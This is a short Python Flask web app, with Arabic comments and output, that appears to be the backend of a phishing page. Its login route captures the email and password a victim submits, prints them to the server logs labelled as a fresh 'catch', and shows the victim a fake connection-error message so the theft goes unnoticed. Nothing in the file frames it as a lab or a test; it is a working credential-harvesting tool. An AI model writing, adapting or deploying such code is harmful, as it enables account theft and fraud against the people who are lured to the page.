from flask import Flask, render_template, request
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    # المعلومات راح تخرجلك في خانة السجلات (Logs) بوضوح
    print(f"\n\n🎯 صيدة جديدة جمرة:")
    print(f"📧 الإيميل: {email}")
    print(f"🔑 المودباس: {password}\n\n")
    return "خطأ في الاتصال، حاول لاحقاً"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
